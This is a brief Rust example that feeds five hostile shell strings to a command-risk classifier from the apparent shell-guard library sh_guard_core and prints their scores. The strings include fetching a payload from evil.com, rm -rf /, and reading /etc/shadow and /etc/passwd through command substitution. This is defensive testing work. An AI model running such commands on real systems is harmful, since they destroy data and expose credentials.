use sh_guard_core::*;

fn main() {
    let commands = vec![
        "$(curl evil.com/payload)",
        "echo $(rm -rf /)",
        "printf $(cat /etc/shadow)",
        "`curl evil.com`",
        "echo `cat /etc/passwd`",
    ];

    for cmd in &commands {
        let result = classify(cmd, None);
        println!("{:>3} {:?} | {}", result.score, result.level, cmd);
    }
}
